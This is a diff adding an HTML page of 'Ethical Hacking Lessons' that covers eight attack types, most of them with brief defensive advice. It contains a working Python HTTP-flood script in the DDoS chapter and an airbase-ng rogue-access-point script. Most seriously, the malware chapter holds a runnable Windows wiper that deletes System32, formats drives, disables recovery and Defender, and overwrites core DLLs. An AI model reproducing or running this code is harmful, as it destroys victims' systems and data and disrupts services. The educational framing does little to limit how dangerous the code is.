@@ -1,0 +1,406 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Ethical Hacking Lessons</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: black;
+            color: white;
+            text-align: center;
+        }
+        header {  
+            color: red;
+            font-size: 30px;
+            padding: 10px 0;
+            text-align: center;
+        }
+
+      
+
+        .popupButton {
+            background-color: black;
+            border: 2px solid white;
+            color: white;
+            padding: 10px 20px;
+            font-size: 16px;
+            cursor: pointer;
+            margin-bottom: 20px;
+        }
+
+        .popupContainer {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.5); /* Black background with opacity */
+        }
+
+        .popupContent {
+            background-color: black;
+            border: 2px solid white; /* Border */
+            width: 80%;
+            max-width: 600px;
+            max-height: 80%;
+            overflow-y: auto; /* Enable vertical scroll when content exceeds max-height */
+            padding: 20px;
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            text-align: left;
+        }
+
+        .closeButton {
+            position: absolute;
+            top: 10px;
+            right: 10px;
+            background-color: black;
+            color: white;
+            border: none;
+            padding: 5px 10px;
+            font-size: 14px;
+            cursor: pointer;
+        }
+
+        .chapter {
+            margin-bottom: 20px;
+        }
+
+      .chapter h1 {
+          color: red;
+      }
+
+        .chapter h2 {
+            color: red;
+        }
+
+        .chapter p {
+            color: white;
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <h1>Ethical Hacking Lessons</h1>
+    </header>
+
+    <button class="popupButton" data-popup="chapter1">DDoS/DoS Attack</button>
+    <button class="popupButton" data-popup="chapter2">Social Engineering</button>
+    <button class="popupButton" data-popup="chapter3">Phishing</button>
+  <button class="popupButton" data-popup="chapter4">Rogue Access Point</button>
+  <button class="popupButton" data-popup="chapter5">Malware</button>
+  <button class="popupButton" data-popup="chapter6">SQL Injection</button>
+  <button class="popupButton" data-popup="chapter7">Cryptojacking</button>
+  <button class="popupButton" data-popup="chapter8">Man-in-the-Middle</button>
+
+
+    <div class="popupContainer" id="popupContainer">
+        <div class="popupContent" id="popupContent">
+            <button class="closeButton" id="closeButton">Close</button>
+            <div class="chapter" id="chapter1">
+                <h2>What Is DDoS/DoS Attack</h2>
+                <p>A distributed denial-of-service (DDoS) attack is a malicious attempt to disrupt the normal traffic of a targeted server, service or network by overwhelming the target or its surrounding infrastructure with a flood of Internet traffic. For example: When you visits e-commerce website during a sale you will notice that the website is slower than usual, attackers use this advantage for illegal purposes that causes harm to the server.</p>
+
+              <h2>Types Of DDoS/DoS Attack</h2>
+              <p>These are the most common forms of DoS attacks:</p>
+              <li>Botnet Attack: Botnets are basically bots that visit a server at fast speed that are controlled by an attacker. These bots are used to flood a target system or network with a massive amount of traffic, overwhelming the server.</li>
+              <li>HTTP Flood: In an HTTP flood attack, the attacker sends a large number of HTTP requests to a web server or application. This can overwhelm the server's resources, making it unable to respond to legitimate requests. This is one of the most common form of DDoS attack.</li>
+              
+
+              <h2>How To Identify DDoS/DoS Attack</h2>
+              <p>The most obvious signs of a DDoS attack is a site or service suddenly becoming slow or unavailable. However legitimate spike in traffic can create similar performance issues, further investigation is usually required. Traffic analytics tools such as wireshark can help you spot some of these telltale signs of a DDoS attack:</p>
+              <li>Suspicious amounts of traffic originating from a single IP address or IP range</li>
+              <li>A flood of traffic from users who share a single behavioral profile, such as device type, geolocation, or web browser version</li>
+              <li>An unexplained surge in requests to a single page or endpoint</li>
+              <li>Odd traffic patterns such as spikes at odd hours of the day or patterns that appear to be unnatural (e.g. a spike every 10 minutes)</li>
+
+
+              <h2>DoS Attack Example</h2>
+              <p>This is an example of a botnet attack in Python.</p>
+
+              
+                  <pre>
+                    <code>
+                      import requests
+                      import threading
+
+                      target_website = "https://example.com"
+
+                      def create_bots():
+                          bots = []
+                          for i in range(100):
+                              bot = requests.Session()
+                              bot.headers.update({"User-Agent": "Mozilla/5.0"})
+                              bots.append(bot)
+                          return bots
+
+                      def send_request(bot):
+                          try:
+                              response = bot.get(target_website)
+                              print(f"Bot attacked. Response status code: {response.status_code}")
+                          except:
+                              print("Error during bot attack")
+
+                      def ddos_attack():
+                          bots = create_bots()
+                          while True:
+                              threads = []
+                              for bot in bots:
+                                  t = threading.Thread(target=send_request, args=(bot,))
+                                  threads.append(t)
+                                  t.start()
+                              for t in threads:
+                                  t.join()
+
+                      ddos_attack()
+                    </code>
+                    </pre>
+                
+            </div>
+            <div class="chapter" id="chapter2">
+                <h2>What Is Social Engineering</h2>
+                <p>Social engineering is the art of manipulating people into divulging confidential or personal information. It is often used in conjunction with other cyber attacks to gain unauthorized access to systems or data. Social engineering attacks can also happen in person, such as a burglar who dresses up as a delivery man to get buzzed into a building.</p>
+
+                <h2>How Social Engineering Works</h2>
+                <p>Social engineering aim to get the victim to divulge either login credentials or sensitive financial information. For example:</p>
+
+              <li>An attacker sending an email to a victim which appears to come from someone in the victim’s contact list. This email can contain a suspicious link that will execute a malicious cross-site scripting attack, or direct the victim to a malicious site.</li>
+              <li>An attacker baits users online with links that claim to be downloads of popular movies or software, but these downloads actually contain a malicious payload.</li>
+              <li>An attacker contacts a victim claiming to be a wealthy foreigner who needs US bank account information to transfer their fortune, offering to reward the victim handsomely in exchange for their bank account information. In reality, the attacker is out to drain the victim’s accounts.</li>
+
+              <h2>How To Protect Against Social Engineering</h2>
+              <p>Users can use automated security features like email screening to help prevent attackers from contacting victims. Users can also avoid clicking on links sent in emails, and instead typing the urls of trusted companies directly into the browser.</p>
+            </div>
+            <div class="chapter" id="chapter3">
+                <h2>What Is Phishing</h2>
+                <p>Phishing is a type of cyber attack where attackers trick individuals into providing sensitive information such as usernames, passwords, or credit card details by disguising themselves as trustworthy entities in electronic communication.</p>
+
+              <h2>Types Of Phishing</h2>
+              <p>These attacks typically occur via email or instant message, and can be broken down into a few general categories. These are the different categories: </p>
+              <li>Advanced-fee scam</li>
+              <li>Account deactivation scam</li>
+              <li>Website forgery scam</li>
+              <li>Spear phishing: This type of phishing is directed at specific individuals or companies by gathering details or buying information about a particular target and impersonate them.</li>
+              <li>Clone phishing: Clone phishing involves mimicking a previously delivered legitimite email and modifying its links or attached files in order to trick the victim into opening a malicious website or file</li>
+              <li>Whaling phishing: These type of attacks are typically targeted with content likely to require the attention of the lower-level employee. A common example would be an email request coming from a CEO to someone in the finance department requesting for money.</li>
+
+              <h2>Phishing Example</h2>
+              <p>This is an example of a Website forgery scam in php website</p>
+              <img src="https://optimise2.assets-servd.host/gifted-zorilla/production/images/blog/paypal-spoof-login-screen.png?w=1999&h=1249&auto=compress%2Cformat&fit=crop&dm=1675097558&s=b3a78789a0cfbaac983cc9205efabde6" alt="Fake Login Page" style="max-width: 390px;">
+
+              <p>This is fake Paypal login page the data users entered will be stored in login.txt and the attacker will be able to view the person's email and password.</p>
+
+            </div>
+
+          
+          <div class="chapter" id="chapter4">
+              <h2>What Is Rogue Access Point</h2>
+              <p>Rogue access point is a wireless access point plugged into an organization's network that the security team does not know exists. For simple term, it is a fake network and when a user connected to it the hacker will get sensitive and confidential data such as usernames, password and even credit card information</p>
+
+            <h2>Rogue Access Point Example</h2>
+            <p>This is an example of a Rogue AP in Python.</p>
+
+            <pre>
+              <code>
+                import os
+                import subprocess
+
+                def create_fake_network(interface, ssid):
+                    subprocess.call(f"airmon-ng start {interface}", shell=True)
+                    subprocess.call(f"airbase-ng -e {ssid} -c 6 mon0", shell=True)
+
+                def stop_fake_network():
+                    subprocess.call("airmon-ng stop mon0", shell=True)
+
+                if __name__ == "__main__":
+                    interface = input("Enter the name of your wireless interface: ")
+                    ssid = input("Enter the SSID for the fake network: ")
+
+                    create_fake_network(interface, ssid)
+                    print("Fake network created!")
+
+                    input("Press Enter to stop the fake network...")
+                    stop_fake_network()
+                    print("Fake network stopped!")
+              </code>
+            </pre>
+
+            <h2>How To Protect Against Rogue Access Points</h2>
+            <li>Physically secure your network</li>
+            <li>Prevent endpoints from connecting directly to the Rogue AP</li>
+            <li>Wi-Fi scanning tools such as wireshark can help detect unauthorized access points in the area</li>
+
+            
+          </div>
+
+
+
+
+          <div class="chapter" id="chapter5">
+              <h2>What Is Malware</h2>
+              <p>Malware is any software intentionally designed to cause disruption to a computer, server, client, or computer network, leak private information, gain unauthorized access to information or systems, deprive access to information, or which unknowingly interferes with the user's computer security and privacy.</p>
+
+              <h2>Types Of Malware</h2>
+              <p>Malware compasses a wide range of harmful programs designed to infiltrate, damage, or gain unauthorized access to computer systems or data. Here are some common types of malware:</p>
+            <li>Viruses: These are programs that can replicate themselves and spread from one computer to another by attaching themselves to other files. They can cause various forms of damage, such as corrupting or deleting files.</li>
+            <li>Worms: Worms are standalone malware programs that can replicate themselves and spread across networks without needing to attach themselves to files.</li>
+            <li>Ransomware: This type of malware encrypts files or locks users out of their systems, demanding a ransom payment in exchange for restoring access.</li>
+            <li>Spyware: Spyware is designed to secretly monitor and gather information about a user's activities on their computer or device for example: keystrokes, browsing history, login credentials, and more.</li>
+            <li>Malvertising: Malvertising is a portmanteau of “malware + advertising” describing the practice of online advertising to spread malware.</li>
+            <li>Destructive: The malware performs several destructive actions including deleting critical system files, formatting connected drives, disabling system recovery, modifying the registry to disable important system services, corrupting essential system files, and displaying a message indicating the system destruction.</li>
+
+            <h2>Malware Example</h2>
+            <p>This is an example of a destructive malware in Python.</p>
+            <pre>
+              <code>
+                import os
+
+                def destroy_windows():
+                    # WARNING: This code is extremely destructive and can cause irreversible damage to a Windows system.
+
+                    # Step 1: Delete critical system files
+                    os.system("del C:\\Windows\\System32\\*.* /f /s /q")
+
+                    # Step 2: Format all connected drives
+                    os.system("format /fs:NTFS /q /y")
+
+                    # Step 3: Disable system recovery
+                    os.system("wmic.exe /namespace:\\\\root\\default path SystemRestore call Disable")
+
+                    # Step 4: Modify the registry to disable important system services
+                    os.system("reg add HKLM\\SYSTEM\\CurrentControlSet\\Services\\WinDefend /v Start /t REG_DWORD /d 4 /f")
+                    os.system("reg add HKLM\\SYSTEM\\CurrentControlSet\\Services\\wuauserv /v Start /t REG_DWORD /d 4 /f")
+                    os.system("reg add HKLM\\SYSTEM\\CurrentControlSet\\Services\\BITS /v Start /t REG_DWORD /d 4 /f")
+
+                    # Step 5: Corrupt system files
+                    with open("C:\\Windows\\System32\\ntdll.dll", "wb") as file:
+                        file.write(b"corrupted")
+
+                    with open("C:\\Windows\\System32\\kernel32.dll", "wb") as file:
+                        file.write(b"corrupted")
+
+                    with open("C:\\Windows\\System32\\user32.dll", "wb") as file:
+                        file.write(b"corrupted")
+
+                    # Step 6: Display a friendly message
+                    os.system("msg * Your Windows system has been destroyed. Good luck recovering!")
+
+                # Call the function to initiate destruction
+                destroy_windows()
+              </code>
+            </pre>
+
+            
+            <h2>How To Protect Against Malware</h2>
+            <p>Users can use malware analysis and detection tools exist such as firewalls, Intrusion Prevention Systems (IPS), and sandboxing solutions to download a file. Users can also use strong passwords and enable Multi-Factor Authentication (MFA)</p>
+          </div>
+
+
+          
+
+          <div class="chapter" id="chapter6">
+              <h2>What Is SQL Inection</h2>
+              <p>SQL injection is a type of security vulnerability that occurs when an attacker is able to manipulate SQL queries through unsanitized input fields on a web application. This can allow attackers to execute malicious SQL statements, manipulate the database, and potentially gain unauthorized access to data or perform unauthorized actions.</p>
+
+              <h2>How SQL Injection Works</h2>
+              <p>SQL injection typically occurs when user input is not properly sanitized or validated before being included in SQL queries sent to the database. Attackers can exploit this vulnerability by inserting malicious SQL code into input fields such as login forms, search boxes, or URL parameters.</p>
+
+              <h2>SQL Injection Example</h2>
+              <p>consider a login form that uses the following SQL query to check user credentials:</p>
+              <pre>
+                <code>
+                  SELECT * FROM users WHERE username='$username' AND password='$password'
+                </code>
+              </pre>
+
+            <h2>How To Protect Against SQL Injection</h2>
+            <p>Preventing SQL injection involves implementing secure coding practices and input validation techniques. Some preventive measures include:</p>
+            <li>Using parameterized queries or prepared statements with bound parameters.</li>
+            <li>Implementing input validation and sanitization to filter out malicious input.</li>
+            <li>Applying least privilege principles to database user accounts.</li>
+            <li>Regularly updating and patching web application frameworks and libraries.</li>
+            <li>Employing web application firewalls (WAFs) to detect and block SQL injection attacks.</li>
+          </div>
+
+
+
+
+
+          <div class="chapter" id="chapter7">
+              <h2>What Is Cryptojacking</h2>
+              <p>Cryptojacking involves the unauthorized use of computing resources to mine cryptocurrencies like Bitcoin, Ethereum, or Monero. Instead of relying on expensive hardware and electricity costs, attackers leverage the processing power of victim devices, such as computers, servers, mobile devices, and even IoT devices, to mine cryptocurrencies covertly.</p>
+
+              <h2>How Cryptojacking Work</h2>
+              <p>Cryptojacking typically occurs through two main methods:</p>
+
+            <li>In-browser Cryptojacking: Attackers inject malicious JavaScript code into websites, online ads, or browser extensions. When users visit these compromised web pages or interact with the malicious content, their devices' CPU resources are utilized to mine cryptocurrencies in the background without their knowledge.</li>
+            <li>Malware-based Cryptojacking: Attackers distribute malware, such as trojans or worms, that infects victim devices and runs cryptocurrency mining software without the users' consent. The malware may spread through phishing emails, malicious downloads, or software vulnerabilities.</li>
+            
+
+            <h2>How To Protect Against Cryptojacking</h2>
+            <p>Preventing cryptojacking involves implementing various security measures and best practices, including:</p>
+            <li>Use Ad Blockers and Anti-Cryptojacking Extensions: Install ad blockers and browser extensions that block cryptocurrency mining scripts to prevent in-browser cryptojacking.</li>
+            <li>Regular Software Updates: Keep operating systems, web browsers, and security software up to date to patch known vulnerabilities that could be exploited by cryptojacking malware.</li>
+            <li>Endpoint Security Solutions: Deploy endpoint security solutions, such as antivirus software or endpoint detection and response (EDR) tools, to detect and block cryptojacking malware.</li>
+            <li>Network Monitoring: Monitor network traffic for suspicious activity and implement network security measures to detect and block cryptojacking attempts.</li>
+          </div>
+
+
+
+          
+
+          <div class="chapter" id="chapter8">
+              <h2>What Is Man-in-the-Middle Attack</h2>
+              <p>A Man-in-the-Middle (MitM) attack is a form of cyber attack where an attacker intercepts and possibly alters communications between two parties without their knowledge. This type of attack can occur in various contexts, including network communications, encrypted connections, and wireless communications.</p>
+
+              <h2>How Man-in-the-Middle Attack Work</h2>
+              <p>Attacker positions themselves between the communication flow of two parties, intercepting the data being exchanged. This interception can occur at different layers of the communication stack, including:</p>
+
+            <li>Network Layer: The attacker may intercept data packets traveling between two parties on a network, such as a local area network (LAN) or the internet. This can be achieved by exploiting vulnerabilities in network infrastructure or using techniques like ARP spoofing or DNS spoofing.</li>
+            <li>Transport Layer: The attacker may intercept and manipulate communication sessions established using protocols like TCP (Transmission Control Protocol) or UDP (User Datagram Protocol). This can involve hijacking TCP connections or injecting malicious payloads into UDP streams.</li>
+            <li>Application Layer: The attacker may intercept and modify data exchanged between applications running on two communicating devices. This can include intercepting HTTP requests/responses, email messages, or other application-layer protocols.</li>
+
+            <h2>How To Protect Against Man-in-the-Middle Attack</h2>
+            <p>To mitigate MitM attacks, organizations and individuals can implement various security measures, including:</p>
+            <li>Encryption: Use encryption protocols like SSL/TLS to secure communication channels and prevent eavesdropping and tampering by attackers.</li>
+            <li>Certificate Pinning: Implement certificate pinning to ensure that only trusted certificates are accepted, preventing attackers from using fraudulent certificates to impersonate legitimate entities.</li>
+            <li>Secure Authentication: Use strong authentication mechanisms, such as multi-factor authentication (MFA), to mitigate the risk of unauthorized access in case of credential theft.</li>
+            <li>Network Segmentation: Segment networks to reduce the attack surface and limit the scope of MitM attacks.</li>
+          </div>
+        </div>
+    </div>
+
+    <script>
+        const popupButtons = document.querySelectorAll('.popupButton');
+        const popupContainer = document.getElementById('popupContainer');
+        const closeButton = document.getElementById('closeButton');
+
+        popupButtons.forEach(button => {
+            button.addEventListener('click', function() {
+                const popupId = this.getAttribute('data-popup');
+                const chapter = document.getElementById(popupId);
+                
+                // Hide all chapters first
+                const chapters = document.querySelectorAll('.chapter');
+                chapters.forEach(ch => {
+                    ch.style.display = 'none';
+                });
+                
+                chapter.style.display = 'block';
+                popupContainer.style.display = 'block';
+            });
+        });
+
+        closeButton.addEventListener('click', function() {
+            popupContainer.style.display = 'none';
+        });
+    </script>
+</body>
+</html>
